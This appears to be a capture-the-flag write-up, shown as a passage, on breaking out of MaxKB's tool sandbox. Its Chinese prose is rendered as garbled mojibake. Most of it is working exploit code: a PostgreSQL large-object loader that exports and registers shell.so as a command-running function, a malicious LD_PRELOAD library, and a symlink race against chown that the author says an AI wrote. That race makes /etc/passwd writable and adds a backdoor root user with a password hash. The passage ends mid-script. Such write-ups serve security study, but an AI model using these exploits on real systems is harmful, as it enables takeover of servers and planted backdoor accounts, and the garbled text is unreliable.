class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>expï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#~/usr/bin/env python 2.7</span><span class="token comment">#-*- coding:utf-8 -*-</span><span class="token keyword">import</span> sys<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">2</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"Usage:python "</span> <span class="token operator">+</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">"inputfile"</span>        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>    fileobj <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">'rb'</span><span class="token punctuation">)</span>    i <span class="token operator">=</span> <span class="token number">0</span>    j <span class="token operator">=</span> <span class="token number">1</span>    sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">"SELECT lo_create(9023);insert into pg_largeobject values (9023, 0, decode('"</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> b <span class="token keyword">in</span> fileobj<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">r'&#123;:02x&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>        <span class="token keyword">if</span> i <span class="token operator">%</span> <span class="token number">2048</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">"','hex'));insert into pg_largeobject values (9023,"</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">", decode('"</span><span class="token punctuation">)</span>            j <span class="token operator">=</span> j <span class="token operator">+</span> <span class="token number">1</span>    fileobj<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">"','hex'));SELECT lo_export(9023, 'shell.so');"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ‰“å…¥ä¸Šé¢çš„ payload åè½½å…¥ so</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token operator">OR</span> <span class="token keyword">REPLACE</span> <span class="token keyword">FUNCTION</span> sys_eva<span class="token punctuation">(</span><span class="token keyword">text</span><span class="token punctuation">)</span> <span class="token keyword">RETURNS</span> <span class="token keyword">text</span> <span class="token keyword">AS</span> <span class="token string">'/opt/maxkb/data/postgresql/pgdata/shell.so'</span><span class="token punctuation">,</span> <span class="token string">'sys_eva'</span> <span class="token keyword">LANGUAGE</span> C STRICT<span class="token punctuation">;</span><span class="token keyword">select</span> sys_eva<span class="token punctuation">(</span><span class="token string">'id'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>äºæ˜¯å®ç°æ²™ç›’é€ƒé€¸</p><p><img src="/blog/2025/11/15/RCTF-2025/IMG-20251116152721461.png"></p><p>ä½†æ˜¯è¿˜å¾—æåˆ° rootï¼Œæ²¡æ‹›äº†</p><hr><h2 id="LD-PRELOAD"><a href="#LD-PRELOAD" class="headerlink" title="LD_PRELOAD"></a>LD_PRELOAD</h2><p>è€ƒè™‘åˆ°åé¢æ”¾å‡ºäº† RootKBâ€“ åè€Œè§£çš„æ›´å°‘ï¼ŒçŒœæµ‹åº”è¯¥æ˜¯åœ¨ 2.3.1 åŠ çš„æ–°ä¸œè¥¿å‘åŠ›äº†ï¼Œè§‚å¯Ÿ commit å˜åŒ–</p><p><img src="/blog/2025/11/15/RCTF-2025/IMG-20251118003626253.png"></p><p>ä» docker é‡ŒæŸ¥çœ‹è¿›ç¨‹æˆ‘ä»¬å¯ä»¥å‘ç°è¿™ä¸ªæœåŠ¡æ˜¯ç”¨ root æƒé™èµ·çš„ï¼Œå¦‚æœæˆ‘ä»¬èƒ½åŠ«æŒè¿™é‡Œçš„ LD_PRELOAD å°±èƒ½æ‹¿ä¸‹ï¼ŒæŸ¥çœ‹æƒé™ï¼ˆå”‰åŸºç¡€ä¸æ‰å®ä»¥ä¸º sandbox è¿™é‡Œæ˜¯ rx æƒé™ï¼‰</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">-rwxr-xr-x <span class="token number">1</span> sandbox root  70K Nov <span class="token number">13</span> <span class="token number">11</span>:19 sandbox.so<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>sandbox æœ‰ rwx æƒé™ï¼Œé‚£å°±æ˜¯å¯å†™ï¼Œé‚£ç›´æ¥å†™æ¶æ„ so å°±å®Œäº‹äº†</p><p>sandbox.c</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">__attribute__</span><span class="token punctuation">(</span><span class="token punctuation">(</span>constructor<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">void</span> <span class="token function">abc</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>src <span class="token operator">=</span> <span class="token string">"/root/flag"</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>dst <span class="token operator">=</span> <span class="token string">"/opt/maxkb-app/apps/static/admin/assets/flag"</span><span class="token punctuation">;</span><span class="token function">rename</span><span class="token punctuation">(</span>src<span class="token punctuation">,</span> dst<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>b64 å†™è¿›å»å³å¯</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64<span class="token keyword">import</span> os<span class="token keyword">def</span> <span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/opt/maxkb-app/sandbox/sandbox.so"</span><span class="token punctuation">,</span> <span class="token string">"wb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">"whoami"</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string">"success"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç„¶åè®¿é—®é™æ€ç›®å½•è¯»å–</p><p><img src="/blog/2025/11/15/RCTF-2025/IMG-20251119151944990.png"></p><hr><h1 id="RootKBâ€“ï¼ˆå¤ç°ï¼‰"><a href="#RootKBâ€“ï¼ˆå¤ç°ï¼‰" class="headerlink" title="RootKBâ€“ï¼ˆå¤ç°ï¼‰"></a>RootKBâ€“ï¼ˆå¤ç°ï¼‰</h1><p>ç‰ˆæœ¬é™åˆ°äº† 2.3.0ï¼Œæ²¡æœ‰ LD_PRELOAD äº†</p><h2 id="è§£æ³•ä¸€ï¼šæ¡ä»¶ç«äº‰-chown"><a href="#è§£æ³•ä¸€ï¼šæ¡ä»¶ç«äº‰-chown" class="headerlink" title="è§£æ³•ä¸€ï¼šæ¡ä»¶ç«äº‰ chown"></a>è§£æ³•ä¸€ï¼šæ¡ä»¶ç«äº‰ chown</h2><p>å°è¯•å†™ä¸€ä¸ª sleep å»¶è¿Ÿåˆ é™¤åœ¨ docker é‡Œçœ‹çœ‹ execute ç›®å½•ä¸‹æ²™ç›’æ‰§è¡Œçš„è„šæœ¬å†…å®¹</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">try</span><span class="token punctuation">:</span>    <span class="token keyword">import</span> os    <span class="token keyword">import</span> sys    <span class="token keyword">import</span> json    path_to_exclude <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'/opt/py3/lib/python3.11/site-packages'</span><span class="token punctuation">,</span> <span class="token string">'/opt/maxkb-app/apps'</span><span class="token punctuation">]</span>    sys<span class="token punctuation">.</span>path <span class="token operator">=</span> <span class="token punctuation">[</span>p <span class="token keyword">for</span> p <span class="token keyword">in</span> sys<span class="token punctuation">.</span>path <span class="token keyword">if</span> p <span class="token keyword">not</span> <span class="token keyword">in</span> path_to_exclude<span class="token punctuation">]</span>    sys<span class="token punctuation">.</span>path <span class="token operator">+=</span> <span class="token punctuation">[</span><span class="token string">'/opt/py3/lib/python3.11/site-packages'</span><span class="token punctuation">,</span> <span class="token string">'/opt/maxkb-app/sandbox/python-packages'</span><span class="token punctuation">,</span> <span class="token string">'/opt/maxkb/python-packages'</span><span class="token punctuation">]</span>    locals_v<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>    keywords<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>    globals_v<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>    <span class="token keyword">exec</span><span class="token punctuation">(</span><span class="token string">'import time\ndef a():\n    return time.sleep(20)'</span><span class="token punctuation">,</span> globals_v<span class="token punctuation">,</span> locals_v<span class="token punctuation">)</span>    f_name<span class="token punctuation">,</span> f <span class="token operator">=</span> locals_v<span class="token punctuation">.</span>popitem<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> local <span class="token keyword">in</span> locals_v<span class="token punctuation">:</span>        globals_v<span class="token punctuation">[</span>local<span class="token punctuation">]</span> <span class="token operator">=</span> locals_v<span class="token punctuation">[</span>local<span class="token punctuation">]</span>    exec_result<span class="token operator">=</span>f<span class="token punctuation">(</span><span class="token operator">**</span>keywords<span class="token punctuation">)</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'/opt/maxkb-app/sandbox/result/019a9ba8-e320-7b83-92c4-8787494f094f.result'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>        <span class="token builtin">file</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"code"</span><span class="token punctuation">:</span><span class="token number">200</span><span class="token punctuation">,</span><span class="token string">"msg"</span><span class="token punctuation">:</span><span class="token string">"æˆåŠŸ"</span><span class="token punctuation">,</span><span class="token string">"data"</span><span class="token punctuation">:</span>exec_result<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'/opt/maxkb-app/sandbox/result/019a9ba8-e320-7b83-92c4-8787494f094f.result'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>        <span class="token builtin">file</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"code"</span><span class="token punctuation">:</span><span class="token number">500</span><span class="token punctuation">,</span><span class="token string">"msg"</span><span class="token punctuation">:</span><span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"data"</span><span class="token punctuation">:</span><span class="token boolean">None</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åœ¨ 2.3.0 çš„æºç ä¸­</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">_exec_sandbox</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> _code<span class="token punctuation">,</span> _id<span class="token punctuation">)</span><span class="token punctuation">:</span>    exec_python_file <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>self<span class="token punctuation">.</span>sandbox_path<span class="token punctuation">&#125;</span></span><span class="token string">/execute/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>_id<span class="token punctuation">&#125;</span></span><span class="token string">.py'</span></span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>exec_python_file<span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>        <span class="token builtin">file</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>_code<span class="token punctuation">)</span>        os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"chown </span><span class="token interpolation"><span class="token punctuation">&#123;</span>self<span class="token punctuation">.</span>user<span class="token punctuation">&#125;</span></span><span class="token string">:root </span><span class="token interpolation"><span class="token punctuation">&#123;</span>exec_python_file<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>    kwargs <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'cwd'</span><span class="token punctuation">:</span> BASE_DIR<span class="token punctuation">&#125;</span>    subprocess_result <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>run<span class="token punctuation">(</span>        <span class="token punctuation">[</span><span class="token string">'su'</span><span class="token punctuation">,</span> <span class="token string">'-s'</span><span class="token punctuation">,</span> python_directory<span class="token punctuation">,</span> <span class="token string">'-c'</span><span class="token punctuation">,</span> <span class="token string">"exec(open('"</span> <span class="token operator">+</span> exec_python_file <span class="token operator">+</span> <span class="token string">"').read())"</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>user<span class="token punctuation">]</span><span class="token punctuation">,</span>        text<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>        capture_output<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>    os<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>exec_python_file<span class="token punctuation">)</span>    <span class="token keyword">return</span> subprocess_result<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å­˜åœ¨å¯¹å†™å…¥çš„ py æ–‡ä»¶è¿›è¡Œ chown çš„æ“ä½œï¼Œä½†æ˜¯è¿™é‡Œæœ‰ä¸ªé—®é¢˜ï¼Œ<code>chown</code> é»˜è®¤ä¼šè·Ÿéš symlink å¹¶ä¿®æ”¹å…¶ç›®æ ‡æ–‡ä»¶ï¼Œè¿™ä¸€ç‚¹å¯ä»¥æƒ³åˆ° <a href="/blog/2024/08/17/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22024/#php-online%EF%BC%88%E5%A4%8D%E7%8E%B0%EF%BC%89">2024 å¹´å·…å³°æå®¢çš„ php_online</a></p><p>å¦‚æœæˆ‘ä»¬èƒ½è®©è¿™é‡Œçš„ exec_python_file ä¸ºä¸€ä¸ª symlinkï¼Œå°±å¯ä»¥ä½¿ç”¨ chown æ“çºµç³»ç»Ÿä¸­ä»»æ„æ–‡ä»¶çš„æ‰€æœ‰æƒ</p><p>é‚£ä¹ˆè¿™é‡Œæœ€å¤§çš„é—®é¢˜å°±æ˜¯å¦‚ä½•å¾—çŸ¥ _id çš„å€¼ï¼Œè¿™é‡Œæ˜¯ <code>_id = str(uuid.uuid7())</code></p><p>â€¦</p><p>ai å¤ªå¯æ€•äº†ï¼Œç›´æ¥æŠŠ exp åå‡ºæ¥äº†ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> threading<span class="token keyword">import</span> time<span class="token keyword">import</span> sys<span class="token keyword">import</span> json<span class="token comment"># ================= é…ç½®åŒºåŸŸ =================</span><span class="token comment"># MaxKB ç›®æ ‡åœ°å€</span>TARGET_URL <span class="token operator">=</span> <span class="token string">"http://127.0.0.1:28080"</span><span class="token comment"># éœ€è¦ä¸€ä¸ªå…·æœ‰ã€Œåº”ç”¨è°ƒè¯•ã€æˆ–ã€Œå·¥å…·æµ‹è¯•ã€æƒé™çš„è´¦å·</span>USERNAME <span class="token operator">=</span> <span class="token string">"admin"</span>PASSWORD <span class="token operator">=</span> <span class="token string">"MaxKB@123456"</span><span class="token comment"># ================= æ¶æ„ Payload (æ³¨å…¥åˆ° MaxKB å†…éƒ¨è¿è¡Œ) =================</span><span class="token comment"># æ³¨æ„ï¼šæ ¹æ®æºç ï¼Œsandbox è·¯å¾„é»˜è®¤ä¸º /opt/maxkb-app/sandbox</span><span class="token comment"># æ‰§è¡Œç›®å½•ä¸º /opt/maxkb-app/sandbox/execute</span>INTERNAL_RACER_CODE <span class="token operator">=</span> <span class="token triple-quoted-string string">r"""import osimport timeimport threadingimport glob# æ”»å‡»ç›®æ ‡ï¼šç³»ç»Ÿå¯†ç æ–‡ä»¶TARGET_FILE = '/etc/passwd'# ç›‘å¬ç›®å½•ï¼šæºç ä¸­ç¡¬ç¼–ç çš„è·¯å¾„SANDBOX_EXEC_DIR = '/opt/maxkb-app/sandbox/execute'# ææƒåå†™å…¥çš„åé—¨ç”¨æˆ· (user: toor, pass: root)BACKDOOR_ENTRY = 'toor:$1$u1UR7D3z$Zp7IvFndtV5XH/tYozXi6.:0:0:root:/root:/bin/bash\n'def racer():    print(f"[Internal] Monitoring &#123;SANDBOX_EXEC_DIR&#125; for race condition...")    while True:        try:            # æé€Ÿæ‰«æç›®å½•ä¸‹çš„ .py æ–‡ä»¶            # æºç ä½¿ç”¨ uuid.uuid7() ç”Ÿæˆæ–‡ä»¶åï¼Œæ— æ³•é¢„æµ‹ï¼Œåªèƒ½æ ¹æ®æ‰©å±•åæ‰«æ            files = [f for f in os.listdir(SANDBOX_EXEC_DIR) if f.endswith('.py')]                        for filename in files:                filepath = os.path.join(SANDBOX_EXEC_DIR, filename)                                # æ’é™¤è½¯é“¾æ¥æœ¬èº«ï¼Œé˜²æ­¢æ­»å¾ªç¯                if not os.path.islink(filepath):                    try:                        # === ç«äº‰æ ¸å¿ƒ ===                        # 1. å‘ç°æ–°ç”Ÿæˆçš„ py æ–‡ä»¶                        # 2. ç¬é—´åˆ é™¤                        os.remove(filepath)                        # 3. å»ºç«‹æŒ‡å‘ /etc/passwd çš„è½¯é“¾æ¥                        os.symlink(TARGET_FILE, filepath)                        print(f"[Internal] Swapped &#123;filename&#125; -> &#123;TARGET_FILE&#125;")                    except OSError:                        # æ–‡ä»¶å¯èƒ½å·²ç»è¢«ä¸»è¿›ç¨‹é”ä½æˆ–åˆ é™¤ï¼Œå¿½ç•¥é”™è¯¯ç»§ç»­å°è¯•                        pass        except Exception as e:            passdef privilege_escalation():    print("[Internal] Watching /etc/passwd permissions...")    start_t = time.time()    # ç›‘æ§ 30 ç§’    while time.time() - start_t &lt; 30:        try:            # æ£€æŸ¥æ˜¯å¦è·å¾—äº†å†™æƒé™            if os.access(TARGET_FILE, os.W_OK):                print("[Internal] SUCCESS! /etc/passwd is writable!")                                # å†™å…¥åé—¨                with open(TARGET_FILE, 'r') as f:                    content = f.read()                                if "toor" not in content:                    with open(TARGET_FILE, 'a') as f:                        f.write(BACKDOOR_ENTRY)                    print("[Internal] Backdoor user 'toor' injected.")                                # éªŒè¯ root æƒé™                print("[Internal] Root access confirmed.")                return        except:            pass        time.sleep(0.1)def main():    # å¯åŠ¨ç«äº‰çº¿ç¨‹    t = threading.Thread(target=racer)    t.daemon = True    t.start()    # å¯åŠ¨ææƒç›‘æ§    privilege_escalation()    return "test""""</span><span class="token comment"># ================= æ§åˆ¶å™¨ (è¿è¡Œåœ¨æ”»å‡»è€…æœ¬åœ°) =================</span><span class="token keyword">class</span> <span class="token class-name">MaxKBExploit</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> url<span class="token punctuation">,</span> user<span class="token punctuation">,</span> pwd<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>url <span class="token operator">=</span> url<span class="token punctuation">.</span>rstrip<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>username <span class="token operator">=</span> user        self<span class="token punctuation">.</span>password <span class="token operator">=</span> pwd        self<span class="token punctuation">.</span>headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>        <span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[*] Logging in as </span><span class="token interpolation"><span class="token punctuation">&#123;</span>self<span class="token punctuation">.</span>username<span class="token punctuation">&#125;</span></span><span class="token string">..."</span></span><span class="token punctuation">)</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>self<span class="token punctuation">.</span>url<span class="token punctuation">&#125;</span></span><span class="token string">/admin/api/user/login"</span></span><span class="token punctuation">,</span> json<span class="token operator">=</span><span class="token punctuation">&#123;</span>                <span class="token string">"username"</span><span class="token punctuation">:</span> self<span class="token punctuation">.</span>username<span class="token punctuation">,</span> <span class="token string">"encryptedData"</span><span class="token punctuation">:</span> <span class="token string">"ftKwsap5K0YkhVj5uELjL3AUkPTU19rG3AyI9S16coqMQuc5f1dPj3oCDuAYhR4VRPzcL0hFF40DLTw/tAXfyvmf/0GEsYLkCtz0E5waThE6fooF5zC2vlGliEqVnrv991QULxtIiNLY7xKlg+R4rUa5u4Z1NNDC0/hUvNRO+i9fGjtCM2Xpc6VgQzwBB4h0G4nb1snRQCAPzu/4DKAx0yU7Bbg9dbZVxXsVssnxipneZ4hj1jiE8HTn/7ZUEu2kj6QvzMe2AltP6gwF4e0YZcNEMeF7ig2uwFee4p6aWQBs3CZ1+YFATRwXksxYmvCqz68sJLcnKmraXS3v85BflA=="</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> res<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span> <span class="token keyword">and</span> <span class="token string">"data"</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                token <span class="token operator">=</span> res<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'token'</span><span class="token punctuation">]</span>                self<span class="token punctuation">.</span>headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"Authorization"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"Bearer </span><span class="token interpolation"><span class="token punctuation">&#123;</span>token<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">&#125;</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] Login successful."</span><span class="token punctuation">)</span>                <span class="token keyword">return</span> <span class="token boolean">True</span>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[-] Login failed: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>e<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token keyword">def</span> <span class="token function">trigger_debug</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> code<span class="token punctuation">,</span> wait<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""        åˆ©ç”¨ MaxKB çš„å·¥å…·è°ƒè¯•æ¥å£æ‰§è¡Œ Python ä»£ç ã€‚        æ ¹æ®æºç ï¼Œè¿™é‡Œè§¦å‘ ToolExecutor.exec_code        """</span>        <span class="token comment"># å®æˆ˜ä¸­ endpoint å¯èƒ½ä¸åŒï¼Œé€šå¸¸æ˜¯ /api/application/&#123;id&#125;/chat æˆ– /api/tool/debug</span>        <span class="token comment"># è¿™é‡Œå‡è®¾ç›´æ¥è°ƒç”¨å·¥å…·å•å…ƒæµ‹è¯•æ¥å£</span>        endpoint <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>self<span class="token punctuation">.</span>url<span class="token punctuation">&#125;</span></span><span class="token string">/admin/api/workspace/default/tool/debug"</span></span> <span class="token comment"># éœ€è¦æ ¹æ®å®é™…æŠ“åŒ…è°ƒæ•´</span>                payload <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"code"</span><span class="token punctuation">:</span> code<span class="token punctuation">,</span>            <span class="token string">"debug_field_list"</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>            <span class="token string">"input_field_list"</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>            <span class="token string">"init_field_list"</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>            <span class="token string">"init_params"</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>                <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> wait<span class="token punctuation">:</span>                <span class="token comment"># è¿™é‡Œçš„ timeout è®¾ç½®è¾ƒé•¿ï¼Œç­‰å¾… Racer è·‘å®Œ</span>                res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>endpoint<span class="token punctuation">,</span> json<span class="token operator">=</span>payload<span class="token punctuation">,</span> headers<span class="token operator">=</span>self<span class="token punctuation">.</span>headers<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">35</span><span class="token punctuation">,</span> proxies<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token 